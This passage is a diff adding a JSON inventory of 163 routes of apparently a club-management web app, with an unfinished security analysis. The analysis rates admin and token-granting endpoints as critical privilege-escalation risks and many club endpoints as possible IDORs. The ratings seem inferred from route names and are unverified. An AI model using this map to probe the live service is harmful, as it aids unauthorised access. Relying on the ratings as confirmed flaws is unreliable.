@@ -1,0 +1,1968 @@
+{
+  "total_routes": 163,
+  "all_routes": [
+    {
+      "route": "/auth/slack",
+      "methods": [
+        "GET"
+      ],
+      "function": "slack_login"
+    },
+    {
+      "route": "/auth/slack/callback",
+      "methods": [
+        "GET"
+      ],
+      "function": "slack_callback"
+    },
+    {
+      "route": "/complete-slack-signup",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "complete_slack_signup"
+    },
+    {
+      "route": "/api/identity/authorize",
+      "methods": [
+        "GET"
+      ],
+      "function": "hackclub_identity_authorize"
+    },
+    {
+      "route": "/maintenance",
+      "methods": [
+        "GET"
+      ],
+      "function": "maintenance"
+    },
+    {
+      "route": "/identity/callback",
+      "methods": [
+        "GET"
+      ],
+      "function": "hackclub_identity_callback"
+    },
+    {
+      "route": "/api/identity/status",
+      "methods": [
+        "GET"
+      ],
+      "function": "hackclub_identity_status"
+    },
+    {
+      "route": "/",
+      "methods": [
+        "GET"
+      ],
+      "function": "index"
+    },
+    {
+      "route": "/login",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "login"
+    },
+    {
+      "route": "/signup",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "signup"
+    },
+    {
+      "route": "/logout",
+      "methods": [
+        "GET"
+      ],
+      "function": "logout"
+    },
+    {
+      "route": "/suspended",
+      "methods": [
+        "GET"
+      ],
+      "function": "suspended"
+    },
+    {
+      "route": "/dashboard",
+      "methods": [
+        "GET"
+      ],
+      "function": "dashboard"
+    },
+    {
+      "route": "/club-dashboard",
+      "methods": [
+        "GET"
+      ],
+      "function": "club_dashboard"
+    },
+    {
+      "route": "/verify-leader",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "verify_leader"
+    },
+    {
+      "route": "/club/<int:club_id>/shop",
+      "methods": [
+        "GET"
+      ],
+      "function": "club_shop"
+    },
+    {
+      "route": "/club/<int:club_id>/orders",
+      "methods": [
+        "GET"
+      ],
+      "function": "club_orders"
+    },
+    {
+      "route": "/api/club/<int:club_id>/shop-items",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_shop_items"
+    },
+    {
+      "route": "/api/admin/shop-items",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_admin_shop_items"
+    },
+    {
+      "route": "/api/club/<int:club_id>/orders",
+      "methods": [
+        "POST"
+      ],
+      "function": "submit_order"
+    },
+    {
+      "route": "/api/club/<int:club_id>/orders",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_orders"
+    },
+    {
+      "route": "/api/club/<int:club_id>/cosmetics/purchase",
+      "methods": [
+        "POST"
+      ],
+      "function": "purchase_cosmetic"
+    },
+    {
+      "route": "/api/club/<int:club_id>/cosmetics",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_club_cosmetics"
+    },
+    {
+      "route": "/api/club/<int:club_id>/slack/settings",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_club_slack_settings"
+    },
+    {
+      "route": "/api/club/<int:club_id>/slack/settings",
+      "methods": [
+        "POST"
+      ],
+      "function": "update_club_slack_settings"
+    },
+    {
+      "route": "/api/club/<int:club_id>/slack/invite",
+      "methods": [
+        "POST"
+      ],
+      "function": "invite_member_to_slack"
+    },
+    {
+      "route": "/api/club/<int:club_id>/slack/bulk-invite",
+      "methods": [
+        "POST"
+      ],
+      "function": "bulk_invite_members_to_slack"
+    },
+    {
+      "route": "/club/<int:club_id>/project-submission",
+      "methods": [
+        "GET"
+      ],
+      "function": "project_submission"
+    },
+    {
+      "route": "/gallery",
+      "methods": [
+        "GET"
+      ],
+      "function": "gallery"
+    },
+    {
+      "route": "/leaderboard",
+      "methods": [
+        "GET"
+      ],
+      "function": "leaderboard"
+    },
+    {
+      "route": "/complete-leader-signup",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "complete_leader_signup"
+    },
+    {
+      "route": "/join-club",
+      "methods": [
+        "GET"
+      ],
+      "function": "join_club_redirect"
+    },
+    {
+      "route": "/api/club/<int:club_id>/chat/messages",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_club_chat_messages"
+    },
+    {
+      "route": "/api/club/<int:club_id>/chat/messages",
+      "methods": [
+        "POST"
+      ],
+      "function": "send_club_chat_message"
+    },
+    {
+      "route": "/api/club/<int:club_id>/chat/messages/<int:message_id>",
+      "methods": [
+        "PUT"
+      ],
+      "function": "edit_club_chat_message"
+    },
+    {
+      "route": "/api/club/<int:club_id>/chat/upload-image",
+      "methods": [
+        "POST"
+      ],
+      "function": "upload_chat_image"
+    },
+    {
+      "route": "/api/club/<int:club_id>/chat/messages/<int:message_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "delete_club_chat_message"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_attendance_sessions"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions",
+      "methods": [
+        "POST"
+      ],
+      "function": "create_attendance_session"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_attendance_session"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/members",
+      "methods": [
+        "POST"
+      ],
+      "function": "add_member_to_session"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/attendance",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_session_attendance"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/guests",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_session_guests"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/guests",
+      "methods": [
+        "POST"
+      ],
+      "function": "add_guest_to_session"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/records/<int:record_id>",
+      "methods": [
+        "PUT"
+      ],
+      "function": "update_attendance_record"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/members",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_club_members_api"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/reports",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_attendance_reports"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/export",
+      "methods": [
+        "GET"
+      ],
+      "function": "export_attendance_data"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/records/<int:record_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "delete_attendance_record"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/guests/<int:guest_id>",
+      "methods": [
+        "PUT"
+      ],
+      "function": "update_guest"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/guests/<int:guest_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "delete_guest"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>",
+      "methods": [
+        "PUT"
+      ],
+      "function": "update_attendance_session"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "delete_attendance_session"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/notes",
+      "methods": [
+        "PUT"
+      ],
+      "function": "update_session_notes"
+    },
+    {
+      "route": "/account",
+      "methods": [
+        "GET"
+      ],
+      "function": "account"
+    },
+    {
+      "route": "/setup-hackatime",
+      "methods": [
+        "GET"
+      ],
+      "function": "setup_hackatime"
+    },
+    {
+      "route": "/blog",
+      "methods": [
+        "GET"
+      ],
+      "function": "blog_list"
+    },
+    {
+      "route": "/blog/<slug>",
+      "methods": [
+        "GET"
+      ],
+      "function": "blog_detail"
+    },
+    {
+      "route": "/blog/create",
+      "methods": [
+        "GET"
+      ],
+      "function": "blog_create"
+    },
+    {
+      "route": "/blog/create",
+      "methods": [
+        "POST"
+      ],
+      "function": "blog_create_post"
+    },
+    {
+      "route": "/blog/<slug>/edit",
+      "methods": [
+        "GET"
+      ],
+      "function": "blog_edit"
+    },
+    {
+      "route": "/blog/<slug>/edit",
+      "methods": [
+        "POST"
+      ],
+      "function": "blog_edit_post"
+    },
+    {
+      "route": "/blog/<slug>/delete",
+      "methods": [
+        "POST"
+      ],
+      "function": "blog_delete"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/join-code",
+      "methods": [
+        "POST"
+      ],
+      "function": "generate_club_join_code"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/posts",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "club_posts"
+    },
+    {
+      "route": "/api/user/update",
+      "methods": [
+        "PUT"
+      ],
+      "function": "update_user"
+    },
+    {
+      "route": "/admin",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_dashboard"
+    },
+    {
+      "route": "/admin/projects/review",
+      "methods": [
+        "GET"
+      ],
+      "function": "project_review"
+    },
+    {
+      "route": "/api/projects/review",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_get_project_submissions"
+    },
+    {
+      "route": "/api/projects/review/<string:project_id>",
+      "methods": [
+        "PUT"
+      ],
+      "function": "api_update_project_review"
+    },
+    {
+      "route": "/api/projects/grant-override/<string:project_id>",
+      "methods": [
+        "PUT"
+      ],
+      "function": "api_grant_override"
+    },
+    {
+      "route": "/api/projects/delete/<string:project_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "api_delete_project"
+    },
+    {
+      "route": "/admin/orders/review",
+      "methods": [
+        "GET"
+      ],
+      "function": "order_review"
+    },
+    {
+      "route": "/api/admin/orders",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_get_all_orders"
+    },
+    {
+      "route": "/api/admin/orders/<string:order_id>/status",
+      "methods": [
+        "PATCH"
+      ],
+      "function": "api_update_order_status"
+    },
+    {
+      "route": "/api/admin/orders/<string:order_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "api_delete_order"
+    },
+    {
+      "route": "/api/admin/orders/<string:order_id>/refund",
+      "methods": [
+        "POST"
+      ],
+      "function": "api_refund_order"
+    },
+    {
+      "route": "/api/admin/users/by-ip",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_users_by_ip"
+    },
+    {
+      "route": "/api/admin/users/<int:user_id>/ips",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_user_ips"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/assignments",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "club_assignments"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/meetings",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "club_meetings"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/meetings/<int:meeting_id>",
+      "methods": [
+        "PUT",
+        "DELETE"
+      ],
+      "function": "club_meeting_detail"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/project-submission",
+      "methods": [
+        "POST"
+      ],
+      "function": "submit_project"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/transactions",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_club_transactions"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/piggy-bank/transactions",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_club_piggy_bank_transactions"
+    },
+    {
+      "route": "/api/admin/clubs/<int:club_id>/transactions",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_create_club_transaction"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/pizza-grants",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "club_pizza_grants"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/projects",
+      "methods": [
+        "GET"
+      ],
+      "function": "club_projects"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/resources",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "club_resources"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/posts/<int:post_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "club_post_detail"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/assignments/<int:assignment_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "club_assignment_detail"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/resources/<int:resource_id>",
+      "methods": [
+        "PUT",
+        "DELETE"
+      ],
+      "function": "club_resource_detail"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/members",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_club_members"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/members/<int:user_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "remove_club_member"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/co-leader",
+      "methods": [
+        "POST",
+        "DELETE"
+      ],
+      "function": "make_co_leader"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/remove-co-leader",
+      "methods": [
+        "POST"
+      ],
+      "function": "remove_co_leader"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/settings",
+      "methods": [
+        "PUT"
+      ],
+      "function": "update_club_settings"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/update-email",
+      "methods": [
+        "POST"
+      ],
+      "function": "update_club_email"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/transfer-leadership",
+      "methods": [
+        "POST"
+      ],
+      "function": "transfer_leadership"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/grant-submissions",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "club_grant_submissions"
+    },
+    {
+      "route": "/api/gallery/posts",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "gallery_posts"
+    },
+    {
+      "route": "/api/gallery/posts/<int:post_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "delete_gallery_post"
+    },
+    {
+      "route": "/api/clubs/<int:club_id>/purchase-requests",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "club_purchase_requests"
+    },
+    {
+      "route": "/api/upload-screenshot",
+      "methods": [
+        "POST"
+      ],
+      "function": "upload_screenshot"
+    },
+    {
+      "route": "/api/upload-images",
+      "methods": [
+        "POST"
+      ],
+      "function": "upload_images"
+    },
+    {
+      "route": "/api/blog/upload-images",
+      "methods": [
+        "POST"
+      ],
+      "function": "upload_blog_images"
+    },
+    {
+      "route": "/api/user/<int:user_id>",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_user_info"
+    },
+    {
+      "route": "/api/hackatime/projects/<int:user_id>",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_hackatime_projects"
+    },
+    {
+      "route": "/api/admin/audit-logs",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_get_audit_logs"
+    },
+    {
+      "route": "/api/admin/users",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_get_users"
+    },
+    {
+      "route": "/api/admin/users/group-by-ip",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_users_group_by_ip"
+    },
+    {
+      "route": "/api/admin/users/group-by-club",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_users_group_by_club"
+    },
+    {
+      "route": "/api/admin/clubs",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_get_clubs"
+    },
+    {
+      "route": "/api/admin/administrators",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_get_administrators"
+    },
+    {
+      "route": "/api/admin/users/<int:user_id>",
+      "methods": [
+        "GET",
+        "PUT",
+        "DELETE"
+      ],
+      "function": "admin_manage_user"
+    },
+    {
+      "route": "/api/admin/clubs",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_create_club"
+    },
+    {
+      "route": "/api/admin/clubs/<int:club_id>",
+      "methods": [
+        "PUT",
+        "DELETE"
+      ],
+      "function": "admin_manage_club"
+    },
+    {
+      "route": "/api/admin/clubs/<int:club_id>/transfer-leadership",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_transfer_club_leadership"
+    },
+    {
+      "route": "/api/admin/users/search",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_search_users"
+    },
+    {
+      "route": "/api/admin/clubs/search",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_search_clubs"
+    },
+    {
+      "route": "/api/admin/administrators",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_add_administrator"
+    },
+    {
+      "route": "/api/admin/administrators/<int:admin_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "admin_remove_administrator"
+    },
+    {
+      "route": "/api/admin/login-as-user/<int:user_id>",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_login_as_user"
+    },
+    {
+      "route": "/api/admin/reset-password/<int:user_id>",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_reset_password"
+    },
+    {
+      "route": "/api/admin/users/<int:user_id>/suspend",
+      "methods": [
+        "PUT"
+      ],
+      "function": "admin_suspend_user"
+    },
+    {
+      "route": "/api/admin/sync-clubs-airtable",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_sync_clubs_airtable"
+    },
+    {
+      "route": "/api/admin/clubs/airtable-preview",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_preview_airtable_clubs"
+    },
+    {
+      "route": "/api/admin/leaderboard/exclusions",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_get_leaderboard_exclusions"
+    },
+    {
+      "route": "/api/admin/leaderboard/exclusions",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_add_leaderboard_exclusion"
+    },
+    {
+      "route": "/api/admin/leaderboard/exclusions/<int:exclusion_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "admin_remove_leaderboard_exclusion"
+    },
+    {
+      "route": "/api/admin/api-keys",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_get_api_keys"
+    },
+    {
+      "route": "/api/admin/api-keys",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_create_api_key"
+    },
+    {
+      "route": "/api/admin/api-keys/<int:key_id>",
+      "methods": [
+        "PUT",
+        "DELETE"
+      ],
+      "function": "admin_manage_api_key"
+    },
+    {
+      "route": "/api/admin/oauth-applications",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_get_oauth_apps"
+    },
+    {
+      "route": "/api/admin/oauth-applications",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_create_oauth_app"
+    },
+    {
+      "route": "/api/admin/oauth-applications/<int:app_id>",
+      "methods": [
+        "PUT",
+        "DELETE"
+      ],
+      "function": "admin_manage_oauth_app"
+    },
+    {
+      "route": "/api/admin/pizza-grants",
+      "methods": [
+        "GET"
+      ],
+      "function": "admin_get_pizza_grants"
+    },
+    {
+      "route": "/api/admin/pizza-grants/review",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_review_pizza_grant"
+    },
+    {
+      "route": "/api/admin/pizza-grants/<string:submission_id>",
+      "methods": [
+        "DELETE"
+      ],
+      "function": "admin_delete_pizza_grant"
+    },
+    {
+      "route": "/api/admin/clubs/allocate-tokens",
+      "methods": [
+        "POST"
+      ],
+      "function": "admin_allocate_tokens_to_existing_clubs"
+    },
+    {
+      "route": "/api/v1/clubs",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_get_clubs"
+    },
+    {
+      "route": "/api/v1/clubs/<int:club_id>",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_get_club"
+    },
+    {
+      "route": "/api/v1/clubs/<int:club_id>/members",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_get_club_members"
+    },
+    {
+      "route": "/api/v1/clubs/<int:club_id>/projects",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_get_club_projects"
+    },
+    {
+      "route": "/api/v1/users/<int:user_id>",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_get_user"
+    },
+    {
+      "route": "/api/v1/clubs/search",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_search_clubs"
+    },
+    {
+      "route": "/api/v1/users/search",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_search_users"
+    },
+    {
+      "route": "/api/v1/analytics/overview",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_get_analytics"
+    },
+    {
+      "route": "/api/v1/admin/clubs/<int:club_id>/tokens/grant",
+      "methods": [
+        "POST"
+      ],
+      "function": "api_grant_tokens"
+    },
+    {
+      "route": "/api/v1/admin/clubs/<int:club_id>/tokens/remove",
+      "methods": [
+        "POST"
+      ],
+      "function": "api_remove_tokens"
+    },
+    {
+      "route": "/oauth/authorize",
+      "methods": [
+        "GET",
+        "POST"
+      ],
+      "function": "oauth_authorize"
+    },
+    {
+      "route": "/oauth/token",
+      "methods": [
+        "POST"
+      ],
+      "function": "oauth_token"
+    },
+    {
+      "route": "/oauth/user",
+      "methods": [
+        "GET"
+      ],
+      "function": "oauth_user"
+    },
+    {
+      "route": "/oauth/user/clubs",
+      "methods": [
+        "GET"
+      ],
+      "function": "oauth_user_clubs"
+    },
+    {
+      "route": "/oauth/user/projects",
+      "methods": [
+        "GET"
+      ],
+      "function": "oauth_user_projects"
+    },
+    {
+      "route": "/oauth/user/assignments",
+      "methods": [
+        "GET"
+      ],
+      "function": "oauth_user_assignments"
+    },
+    {
+      "route": "/oauth/user/meetings",
+      "methods": [
+        "GET"
+      ],
+      "function": "oauth_user_meetings"
+    },
+    {
+      "route": "/oauth/debug",
+      "methods": [
+        "GET"
+      ],
+      "function": "oauth_debug"
+    },
+    {
+      "route": "/oauth/debug/callback",
+      "methods": [
+        "GET"
+      ],
+      "function": "oauth_debug_callback"
+    },
+    {
+      "route": "/api/docs",
+      "methods": [
+        "GET"
+      ],
+      "function": "api_documentation"
+    },
+    {
+      "route": "/api/club/<int:club_id>/quests",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_club_quests"
+    },
+    {
+      "route": "/admin/api/settings",
+      "methods": [
+        "GET"
+      ],
+      "function": "get_settings"
+    },
+    {
+      "route": "/admin/api/settings",
+      "methods": [
+        "POST"
+      ],
+      "function": "update_setting"
+    }
+  ],
+  "security_analysis": {
+    "critical": [
+      {
+        "route": "/api/admin/administrators",
+        "methods": [
+          "GET"
+        ],
+        "function": "admin_get_administrators",
+        "vulnerability": "Privilege escalation / Account takeover",
+        "impact": "Complete system compromise"
+      },
+      {
+        "route": "/api/admin/administrators",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_add_administrator",
+        "vulnerability": "Privilege escalation / Account takeover",
+        "impact": "Complete system compromise"
+      },
+      {
+        "route": "/api/admin/administrators/<int:admin_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "admin_remove_administrator",
+        "vulnerability": "Privilege escalation / Account takeover",
+        "impact": "Complete system compromise"
+      },
+      {
+        "route": "/api/admin/login-as-user/<int:user_id>",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_login_as_user",
+        "vulnerability": "Privilege escalation / Account takeover",
+        "impact": "Complete system compromise"
+      },
+      {
+        "route": "/api/admin/clubs/allocate-tokens",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_allocate_tokens_to_existing_clubs",
+        "vulnerability": "Financial manipulation",
+        "impact": "Unlimited token creation/destruction"
+      },
+      {
+        "route": "/api/v1/admin/clubs/<int:club_id>/tokens/grant",
+        "methods": [
+          "POST"
+        ],
+        "function": "api_grant_tokens",
+        "vulnerability": "Financial manipulation",
+        "impact": "Unlimited token creation/destruction"
+      },
+      {
+        "route": "/api/v1/admin/clubs/<int:club_id>/tokens/remove",
+        "methods": [
+          "POST"
+        ],
+        "function": "api_remove_tokens",
+        "vulnerability": "Financial manipulation",
+        "impact": "Unlimited token creation/destruction"
+      }
+    ],
+    "high": [
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions",
+        "methods": [
+          "GET"
+        ],
+        "function": "get_attendance_sessions",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions",
+        "methods": [
+          "POST"
+        ],
+        "function": "create_attendance_session",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>",
+        "methods": [
+          "GET"
+        ],
+        "function": "get_attendance_session",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/members",
+        "methods": [
+          "POST"
+        ],
+        "function": "add_member_to_session",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/attendance",
+        "methods": [
+          "GET"
+        ],
+        "function": "get_session_attendance",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/guests",
+        "methods": [
+          "GET"
+        ],
+        "function": "get_session_guests",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/guests",
+        "methods": [
+          "POST"
+        ],
+        "function": "add_guest_to_session",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/records/<int:record_id>",
+        "methods": [
+          "PUT"
+        ],
+        "function": "update_attendance_record",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/members",
+        "methods": [
+          "GET"
+        ],
+        "function": "get_club_members_api",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/reports",
+        "methods": [
+          "GET"
+        ],
+        "function": "get_attendance_reports",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/export",
+        "methods": [
+          "GET"
+        ],
+        "function": "export_attendance_data",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/records/<int:record_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "delete_attendance_record",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/guests/<int:guest_id>",
+        "methods": [
+          "PUT"
+        ],
+        "function": "update_guest",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/guests/<int:guest_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "delete_guest",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>",
+        "methods": [
+          "PUT"
+        ],
+        "function": "update_attendance_session",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "delete_attendance_session",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/attendance/sessions/<int:session_id>/notes",
+        "methods": [
+          "PUT"
+        ],
+        "function": "update_session_notes",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/join-code",
+        "methods": [
+          "POST"
+        ],
+        "function": "generate_club_join_code",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/posts",
+        "methods": [
+          "GET",
+          "POST"
+        ],
+        "function": "club_posts",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/admin/orders/<string:order_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "api_delete_order",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/orders/<string:order_id>/refund",
+        "methods": [
+          "POST"
+        ],
+        "function": "api_refund_order",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/assignments",
+        "methods": [
+          "GET",
+          "POST"
+        ],
+        "function": "club_assignments",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/meetings",
+        "methods": [
+          "GET",
+          "POST"
+        ],
+        "function": "club_meetings",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/meetings/<int:meeting_id>",
+        "methods": [
+          "PUT",
+          "DELETE"
+        ],
+        "function": "club_meeting_detail",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/project-submission",
+        "methods": [
+          "POST"
+        ],
+        "function": "submit_project",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/transactions",
+        "methods": [
+          "GET"
+        ],
+        "function": "get_club_transactions",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/piggy-bank/transactions",
+        "methods": [
+          "GET"
+        ],
+        "function": "get_club_piggy_bank_transactions",
+        "vulnerability": "Potential IDOR",
